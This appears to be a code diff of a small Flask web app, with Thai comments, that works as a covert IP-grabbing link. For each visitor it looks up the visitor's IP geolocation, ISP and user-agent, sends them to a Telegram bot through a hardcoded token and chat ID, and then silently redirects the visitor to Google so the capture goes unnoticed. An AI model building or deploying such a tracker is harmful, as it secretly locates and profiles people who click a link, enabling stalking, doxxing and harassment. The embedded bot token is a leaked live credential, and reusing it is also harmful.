@@ -3,10 +3,21 @@ import requests
 
 app = Flask(__name__)
 
+# ฟังก์ชันส่งแจ้งเตือนเข้า Telegram
+def send_telegram_alert(msg):
+    token = "8827060061:AAHCAtyCdFcVX84EUb_svcCIAChZRtKYJ7c"
+    chat_id = "8386956572"
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    try:
+        requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=4)
+    except:
+        pass
+
+# ฟังก์ชันเช็คพิกัดและ ISP จาก IP
 def get_geo_info(ip):
     if ip.startswith(('127.', '192.168.', '10.')) or ip == 'localhost':
         return {"status": "private"}
-
+    
     url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query"
     try:
         res = requests.get(url, timeout=5)
@@ -16,16 +27,31 @@ def get_geo_info(ip):
 
 @app.route('/')
 def home():
-    # อ่าน Public IP จริงของผู้ใช้ผ่าน Cloud Proxy Header
+    # ดึง IP จริงผ่าน Cloud Proxy Header
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    print(f"\n[+] มีคนกดเปิดลิงก์! IP: {user_ip}")
-
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    
     geo = get_geo_info(user_ip)
-    if geo.get('status') == 'success':
-        print(f"    - ประเทศ : {geo.get('country')}")
-        print(f"    - พื้นที่   : {geo.get('regionName')}, {geo.get('city')}")
-        print(f"    - ค่ายเน็ต : {geo.get('isp')} ({geo.get('org')})")
+    
+    country = geo.get('country', 'N/A')
+    region = geo.get('regionName', '')
+    city = geo.get('city', '')
+    isp = geo.get('isp', 'N/A')
+    org = geo.get('org', '')
 
+    # จัดรูปแบบข้อความแจ้งเตือน
+    alert_text = (
+        f"🚨 มีคนกดเปิดลิงก์!\n"
+        f"🌐 IP: {user_ip}\n"
+        f"📍 พิกัด: {country} ({region}, {city})\n"
+        f"🏢 ISP: {isp} / {org}\n"
+        f"📱 อุปกรณ์: {user_agent[:60]}..."
+    )
+    
+    # ส่งข้อความเข้า Telegram ทันที
+    send_telegram_alert(alert_text)
+    
+    # ส่งผู้ใช้ไปยัง Google ทันที
     return redirect("https://www.google.com")
 
 if __name__ == '__main__':
